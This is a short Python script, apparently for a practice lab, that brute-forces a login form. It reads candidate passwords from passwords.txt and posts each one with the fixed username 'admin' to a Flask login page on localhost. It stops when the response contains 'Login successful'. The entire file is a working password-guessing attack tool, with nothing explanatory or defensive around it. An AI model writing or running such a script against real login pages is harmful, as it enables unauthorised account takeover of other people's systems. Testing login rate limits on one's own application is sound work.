import requests

url = "http://127.0.0.1:5000/"  # Your Flask login page
username = "admin"  # Fixed username

with open("passwords.txt", "r") as file:
    for line in file:
        password = line.strip()
        data = {
            "username": username,
            "password": password
        }

        response = requests.post(url, data=data)

        if "Login successful" in response.text:
            print(f"✅ Password found: {password}")
            break
        else:
            print(f"❌ Tried: {password}")
